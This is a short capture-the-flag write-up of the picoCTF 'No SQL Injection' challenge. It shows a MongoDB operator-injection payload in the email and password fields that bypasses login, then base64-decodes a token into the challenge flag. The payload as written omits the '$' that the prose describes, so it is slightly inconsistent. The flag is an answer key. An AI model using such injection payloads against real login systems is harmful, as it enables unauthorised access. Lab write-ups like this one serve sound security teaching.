## No SQL Injection

[Link to challenge](https://play.picoctf.org/practice/challenge/443)

Write-up:

1. Analyzing the source code given, we see the server is using MongoDB. Since it parses the login form (email and password) as JSON, we can craft a payload for those fields:
   **{ $ne: null }**: $ne meaning "not equal". Since no valid user has null email nor password, every user will match this, and provide us with admin access, as well as a successful request.
   `{`
	   `"email":"{\"ne\": null}",`
	   `"password":"{\"ne\": null}"`
	`}`

2. Analyzing the response with Caido, we see that the token is encoded:
   `{`
    `"success": true,`
    `"email": "picoplayer355@picoctf.org",`
    `"token": "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==",`
    `"firstName": "pico",`
    `"lastName": "player"`
	`}`

3. The 2 equal signs at the end suggest base64 encoding. Decoding with CyberChef returns the flag: ***picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}***